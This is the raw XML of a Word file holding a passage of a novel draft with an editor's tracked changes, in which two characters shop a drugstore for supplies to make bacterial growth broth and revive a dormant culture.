        <w:t xml:space="preserve"> too, so the entire colony hides inside a massive layer of sticky crust. It’s like they make a little fort. And once they’re inside, they go into a natural suspended animation. They basically shut down all their life processes except for the barest essentials, and sit there and wait for the threat to pass.”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crusty stuff is a panic room for germs?”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“Exactly,” said Tina. “They must’ve started forming it when they came out of the freezer and woke up to find themselves in glycerol solution. They’re terrified out of their little wits.”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what’s it mean for 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means,” said Tina, looking closely at the vial, “that they’re still alive.”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long can they stay like that?”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“Oh, once they lock themselves inside a plaque like this, they can stay there for pretty damn long. The trick is waking them up and convincing them it’s safe to come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that be done?”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looked around, taking stock of the drugstore. With a gleam in her eye, she said, “Let’s see what I can do!” She put the tied-off latex glove and the rubbing alcohol into the shopping basket, and scanned the shelves of the First Aid aisle. She found a digital oral thermometer and added it to her cache. “We’re going to make us some lysogeny broth. See if you can find a Pyrex bowl. At least a quart. With a lid. And grab a measuring cup. And an oven mitt. If we’re lucky, Nat might find us an autoclave at the hospital. If not, we’ll just take our chances with her stove. Lord knows it’s never been used for cooking.”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“Uh… Sure! Yes! Okay!” Danny replied. He sensed that something technical was happening, but it</w:t>
      </w:r>
      <w:ins w:id="1889" w:author="TextVet" w:date="2016-03-20T14:27:00Z">
        <w:r w:rsidR="00756C95">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—the microbial universe—</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> was </w:t>
      </w:r>
      <w:del w:id="1890" w:author="TextVet" w:date="2016-03-20T14:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00756C95">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>so far outside</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1891" w:author="TextVet" w:date="2016-03-20T14:28:00Z">
        <w:r w:rsidR="00D60E05">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>another realm</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1892" w:author="TextVet" w:date="2016-03-20T14:26:00Z">
        <w:r w:rsidR="00756C95">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> from</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1893" w:author="TextVet" w:date="2016-03-20T14:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00756C95">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his </w:t>
      </w:r>
      <w:del w:id="1894" w:author="TextVet" w:date="2016-03-20T14:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00756C95">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">domain of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>expertise</w:t>
      </w:r>
      <w:ins w:id="1895" w:author="TextVet" w:date="2016-03-20T14:27:00Z">
        <w:r w:rsidR="00756C95">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">. </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1896" w:author="TextVet" w:date="2016-03-20T14:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00756C95">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> that h</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1897" w:author="TextVet" w:date="2016-03-20T14:27:00Z">
        <w:r w:rsidR="00756C95">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>H</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e felt like a total layman. He hadn’t felt like that in a very, very long time</w:t>
      </w:r>
      <w:ins w:id="1898" w:author="TextVet" w:date="2016-03-20T14:29:00Z">
        <w:r w:rsidR="00BC0F08">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1899" w:author="TextVet" w:date="2016-03-20T14:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BC0F08">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900" w:author="TextVet" w:date="2016-03-20T14:29:00Z">
        <w:r w:rsidR="00BC0F08">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1901" w:author="TextVet" w:date="2016-03-20T14:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BC0F08">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>H</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e found himself liking it</w:t>
      </w:r>
      <w:ins w:id="1902" w:author="TextVet" w:date="2016-03-20T14:29:00Z">
        <w:r w:rsidR="000F6E07">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1903" w:author="TextVet" w:date="2016-03-20T14:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000F6E07">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904" w:author="TextVet" w:date="2016-03-20T14:29:00Z">
        <w:r w:rsidR="000F6E07">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1905" w:author="TextVet" w:date="2016-03-20T14:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000F6E07">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>O</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:ins w:id="1906" w:author="TextVet" w:date="2016-03-20T14:29:00Z">
        <w:r w:rsidR="000F6E07">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more specifically, liking being made to feel this way</w:t>
      </w:r>
      <w:ins w:id="1907" w:author="TextVet" w:date="2016-03-20T14:30:00Z">
        <w:r w:rsidR="000F6E07">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1908" w:author="TextVet" w:date="2016-03-20T14:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000F6E07">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1909" w:author="TextVet" w:date="2016-03-20T14:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000F6E07">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1910" w:author="TextVet" w:date="2016-03-20T14:30:00Z">
        <w:r w:rsidR="000F6E07">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1911" w:author="TextVet" w:date="2016-03-20T14:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000F6E07">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>O</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:ins w:id="1912" w:author="TextVet" w:date="2016-03-20T14:29:00Z">
        <w:r w:rsidR="000F6E07">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more specifically still, being made to feel this way </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1913" w:author="TextVet" w:date="2016-03-20T14:33:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>by her</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. He set out toward the kitchenware section and gathered Tina’s spell components.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When he finished, he found her in a nearby aisle. He dropped his materials into her basket. “What else do we need for this soup recipe?”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“Lysogeny broth,” she corrected. “We’ll need salt, tryptone, and yeast extract.”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“You’ve done this before, haven’t you?” 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blushed. “It’s easier than it looks. The trick with biology is that these things </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>want</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to work by themselves. Living things are self-correcting. It’s called homeostasis. If you have a biological process and something goes wrong, it usually breaks in a way that compensates for the damage.”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in engineering we call that a robust failure mode,” said Danny. “It’s a form of fault tolerance. If a component fails, the other components of the system not only compensate but actually help get the failed component working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t>
      </w:r>
      <w:commentRangeStart w:id="1914"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Yeah. In nature</w:t>
      </w:r>
      <w:commentRangeEnd w:id="1914"/>
      <w:r w:rsidR="001565F4">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1914"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, everything’s built that way,” said Tina. “Life’s a lot less fragile than most people think. Humans have been building machines for about five thousand years. Cellular life has been self-replicating for about three and a half billion. It’s probably doing something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felt both inspired and intimidated. “So, those other ingredients…” he said, deflecting his attention to the task at hand. “I know what table salt is. The other two… Um, is there a Lab Chemicals aisle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“They’re just fancy names for bacteria food,” said Tina. “Lysogeny broth is a mixture of fairly common stuff that happens to be super nutritious for a growing young bacterial colony. Yeast extract is rich in glutamates for building new proteins, and nucleotides to give the bacteria raw materials for replicating their DNA. And the other stuff, tryptone, that’s just a big pile of amino acids from dairy proteins… Whaaat?” she suddenly asked him self-consciously.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what?” Danny asked, bewildered.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“You’re looking at me like you want to say something,”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“Heh, it’s nothing. I’m just… impressed.” She met his gaze again with a look that cut his breath short — her hair falling around her face, her dark eyes looking mischievously at him. Her nose stud glinted in the fluorescent light. “So. Amino acids, right?” he </w:t>
      </w:r>
      <w:ins w:id="1915" w:author="TextVet" w:date="2016-03-20T14:38:00Z">
        <w:r w:rsidR="00872350">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>reaffirme</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1916" w:author="TextVet" w:date="2016-03-20T14:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00872350">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w:t>
      </w:r>
      <w:del w:id="1917" w:author="TextVet" w:date="2016-03-20T14:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C84770">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> abruptly</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have an idea. Follow me.” He led Tina to the Diet Supplements aisle. </w:t>
      </w:r>
      <w:ins w:id="1918" w:author="TextVet" w:date="2016-03-20T14:42:00Z">
        <w:r w:rsidR="005035B4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Below</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1919" w:author="TextVet" w:date="2016-03-20T14:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005035B4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Amidst</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> white bottles filled with pills of calcium and zinc and vitamins</w:t>
      </w:r>
      <w:ins w:id="1920" w:author="TextVet" w:date="2016-03-20T14:39:00Z">
        <w:r w:rsidR="007A0C59">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1921" w:author="TextVet" w:date="2016-03-20T14:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007A0C59">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> were</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tubs of powdered bodybuilding formulas, with names </w:t>
      </w:r>
      <w:commentRangeStart w:id="1922"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">like </w:t>
      </w:r>
      <w:commentRangeEnd w:id="1922"/>
      <w:r w:rsidR="007A0C59">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1922"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“Cyto Gainer”, “Muscle Milk”, and “Amino Fuel”</w:t>
      </w:r>
      <w:ins w:id="1923" w:author="TextVet" w:date="2016-03-20T14:39:00Z">
        <w:r w:rsidR="007A0C59">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> walled </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1924" w:author="TextVet" w:date="2016-03-20T14:42:00Z">
        <w:r w:rsidR="005035B4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>and buttressed</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nodded gleefully. “Danny, you’re a freakin’ genius!” She picked up a tub labeled “Complete Casein”. “Ohhhhhhhh man, they are going to love this shit!” she </w:t>
      </w:r>
      <w:ins w:id="1925" w:author="TextVet" w:date="2016-03-20T14:44:00Z">
        <w:r w:rsidR="005B23E1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>rejoice</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1926" w:author="TextVet" w:date="2016-03-20T14:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005B23E1">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 xml:space="preserve">d as she read the nutritional information on the back. She took the vial </w:t>
      </w:r>
      <w:del w:id="1927" w:author="TextVet" w:date="2016-03-20T14:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00173D80">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">in one hand </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>and wiggled it toward the tub, s</w:t>
      </w:r>
      <w:ins w:id="1928" w:author="TextVet" w:date="2016-03-20T14:46:00Z">
        <w:r w:rsidR="00173D80">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>oftly assuring</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1929" w:author="TextVet" w:date="2016-03-20T14:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00173D80">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>aying</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, “Right, little guys? You want some casein? Some nice tasty casein? Yes you do! Oh </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1930" w:author="TextVet" w:date="2016-03-20T14:45:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>yes</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> you do! And maybe some B-complex gel-caps? </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1931" w:author="TextVet" w:date="2016-03-20T14:47:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>Yeah?</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Good little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smiled warmly at her antics.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“Sterilization is going to be tricky, though,” Tina mentioned pensively. “There’s bacteria around us all the time — in the air, in the water, everywhere. If a bacterium gets into the lysogeny broth, it’ll multiply along with our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strain, and compete for the broth’s nutrients. Normally, when people do this in a lab, the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is intentionally given resistance to some specific antibiotic, and the lysogeny broth is infused with that antibiotic, so only our strain can survive. We can’t do that because we don’t know what antibiotic these guys were bred to resist, if any. But if we’re lucky…”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listened to her talk, reeling with admiration. She stood in the aisle, shopping basket in one hand, purse in the other. Hair dark and haphazard. An unassuming stud glinting on the side of her nose. And a gleam of competent determination in her eyes.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paused for a moment. “Hey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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003169EF" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="1932" w:author="TextVet" w:date="2016-03-20T14:53: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“You’re looking at me like that again</w:t>
      </w:r>
      <w:ins w:id="1933" w:author="TextVet" w:date="2016-03-20T14:51:00Z">
        <w:r w:rsidR="003169EF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1934" w:author="TextVet" w:date="2016-03-20T14:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003169EF">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w:t>
      </w:r>
      <w:del w:id="1935" w:author="TextVet" w:date="2016-03-20T14:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003169EF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
